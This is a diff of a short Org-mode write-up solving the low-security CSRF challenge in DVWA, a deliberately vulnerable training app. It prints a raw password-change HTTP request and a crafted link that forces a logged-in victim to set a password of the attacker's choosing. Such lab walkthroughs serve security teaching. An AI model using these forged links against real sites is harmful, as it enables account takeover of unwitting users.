@@ -1,5 +1,12 @@
-In this first challenge the endpoint to change password is not protected at all. Consider the following request, which is a valid request to change one's password
+#+TITLE: DVWA - CSRF Low
+#+AUTHOR: Leonardo Tamiano
 
+* Description
+  In this first challenge the endpoint to change password is not
+  protected at all. Consider the following request, which is a valid
+  request to change one's password. 
+
+  #+begin_example
 GET /vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change HTTP/1.1
 Host: evil
 Pragma: no-cache
@@ -12,7 +19,15 @@ Accept-Encoding: gzip, deflate, br
 Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
 Cookie: PHPSESSID=etov4q0s936tquopvb3b56app0; security=low
 Connection: close
+  #+end_example
 
-Simply send the following link to an authenticated user and you will force them to change their password with the password of your choosing
+  All we need to do is to create a link which triggers this request.
 
+* Solution
+  Simply send the following link to an authenticated user, force him
+  to click it, and you will force them to change their password with
+  the password of your choosing.
+
+  #+begin_example
 http://evil/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change
+  #+end_example
